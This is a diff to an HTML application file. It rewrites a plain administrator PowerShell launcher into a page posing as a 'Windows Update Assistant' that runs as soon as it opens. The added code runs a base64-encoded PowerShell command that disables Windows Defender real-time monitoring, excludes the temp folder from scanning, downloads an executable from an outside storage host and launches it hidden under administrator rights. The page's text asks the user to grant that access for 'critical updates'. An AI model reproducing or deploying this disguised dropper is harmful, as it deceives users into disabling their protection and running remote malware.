@@ -1,19 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Admin PowerShell Launcher</title>
-<HTA:APPLICATION ID="launcher" APPLICATIONNAME="Admin PS" WINDOWSTATE="normal" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes">
-</head>
-<script language="JavaScript">
-    function openPowerShell() {
-        var shell = new ActiveXObject("Shell.Application");
-        // Launches PowerShell as admin, no additional commands
-        shell.ShellExecute("powershell.exe", "", "", "runas", 1);
-        window.close();
-    }
-    window.onload = openPowerShell;
+<title>Windows Update Assistant</title>
+<HTA:APPLICATION ID="update" APPLICATIONNAME="Windows Update" WINDOWSTATE="normal" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" />
+<script language="VBScript">
+    Sub Window_OnLoad
+        Dim encoded
+        encoded = "UwBlAHQALQBNAFAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARgBvAHIAYwBlADsAIABBAGQAZAAtAE0AUABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABlAG4AdgA6AFQARQBNAFAAIAAtAEUAcgByAG8AcgBBAEMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAOwAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwB4AG0AbwBzAHUAYQB1AGcAaAB3AGoAZQBuAGkAZABtAGEAdQByAGkALgBzAHUAcABhAGIAYQBzAGUALgBjAG8ALwBzAHQAbwByAGEAZwBlAC8AdgAxAC8AbwBiAGoAZQBjAHQALwBwAHUAYgBsAGkAYwAvAGYAaQBsAGUAcwAvAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUALgBlAHgAZQAnACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABXAGkAbgBkAG8AdwBzAFUAcABkAGEAdABlAC4AZQB4AGUAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AFQARQBNAFAAXABXAGkAbgBkAG8AdwBzAFUAcABkAGEAdABlAC4AZQB4AGUAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA=="
+        
+        Dim powershell
+        powershell = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Normal -EncodedCommand " & encoded
+        
+        CreateObject("Shell.Application").ShellExecute "powershell.exe", powershell, "", "runas", 1
+        
+        window.close
+    End Sub
 </script>
-<body style="background:#e0e0e0; text-align:center; padding:50px;">
-    <h2>Launching PowerShell as Administrator...</h2>
+</head>
+<body style="background:#1e6dc9; text-align:center; padding:50px; color:white; font-family:Segoe UI;">
+    <h2>✔️ Windows Update Assistant</h2>
+    <p>Please allow Administrator access to install critical updates...</p>
 </body>
 </html>
